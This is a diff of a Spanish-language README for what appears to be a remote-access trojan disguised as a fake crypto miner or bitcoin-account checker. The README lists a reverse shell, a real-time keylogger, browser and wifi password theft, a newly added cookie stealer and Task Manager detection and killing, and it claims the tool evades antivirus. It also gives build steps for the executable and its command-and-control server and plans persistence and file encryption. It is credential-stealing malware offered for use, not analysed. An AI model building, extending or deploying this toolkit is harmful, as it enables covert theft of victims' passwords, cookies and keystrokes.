@@ -8,7 +8,9 @@
 
 
 Features:
-         
+
+         $ Cookie stealer y deteccion y eliminacion del administrador de tareas!         
+
          $ Diferentes Modelos (mismos metodos)
          
          $ Este fakeminer, en el ordenador en el que se ejecute, te da acceso a un 
@@ -19,11 +21,14 @@ Features:
                2. Keylogger en tiempo real (conex. cifrada) :5000
                3. Contraseñas en navegadores (edge/brave/google) (conex. cifrada) :5002
                4. Contraseñas wifi guardadas (conex. cifrada) :5002
+               5. Deteccion y eliminación del Adminsitrador de tareas
+               6. Cookie Stealer!
 
-         Testeado con windows defender, malwarebytes y McAfee (Seguridad Dispositivo), no da positivo!   
+         Testeado con windows defender y malwarebytes, no da positivo!   
 --- 
 # Explicaciones
         
+
 
       Tenemos diferentes plantillas para usarlo, un Minero falso, de manera invisible y la ultima,
       checkeando cuentas de bitcoin (funciona).
@@ -31,7 +36,7 @@ Features:
       Al ejecutar el server.py, solamente veremos la reverse shell, lo demas se esta guardando 
       en el escritorio. Si queremos podemos ejecutar individualmente los archivos de dentro 
       de la carpeta server, esto hara que veamos los keystrokes que se van capturando en tiempo 
-      real.
+      real, las cookies, etc. TODO SE GUARDA EN EL DESKTOP
 
       Para el apartado del servidor podemos ejecutarlo en linux/windows.
       Para compilar necesitaremos el uso de un windows...
@@ -64,6 +69,7 @@ Files:
       client/get_points.py     -->  Wifi Password Stealer
       client/CryptoPhenix.py   -->  Used for chipher or decipher data
       client/certs.py          -->  Certs for cipher the comms
+      client/getSesions.py     -->  Cookie Stealer
 ---
 
       server/cmd_cntr.py       -->  Command & Control Server
@@ -71,6 +77,7 @@ Files:
       server/recv_keys.py      -->  Recive the keystrokes in real time
       server/server.py         -->  Main file to start the server listen
       server/certs.py          -->  Certs for cipher the comms
+
 ---
 
 # Preparación (AUTOMÁTICA)
@@ -100,19 +107,13 @@ del repositorio
            [+] Importing certs to server...
        [*] DONE! 
 
-4. Seleccionamos la 3a opción y especificamos una direccion IP (Estará encriptada)
-
-        Select [!>] 3
-        Enter IP [!>] 127.0.0.1
-
-6. Seleccionamos la 4ta opción y especificamos si queremos que se requiera ser administrador:
-(Espearar a que pyinstaller acabe el proceso....)   
-
+4. Seleccionamos la 4ta opción y especificamos si queremos que se requiera ser administrador:
+   
        [!] Do you want to run as admintrator? [ (S) Default / n ] > n
 
        [*] Compiling...  
 
-7. Ahora tendremos el .exe generado y funcionando, podemos abandonar el script o ejecutar el servidor
+5. Ahora tendremos el .exe generado y funcionando, podemos abandonar el script o ejecutar el servidor
 
              Select [!>] 5
            [!] STARTED C&C SERVER
@@ -245,7 +246,10 @@ En esta funcion debemos especificar la direccion IP. Ahora tenemos dos opciones:
 
 # Proximamente!
 
+#### Mejora del servidor C2
 #### Persistencia
+#### Firewall Modification
+#### Encriptacion de archivos
 
 
 
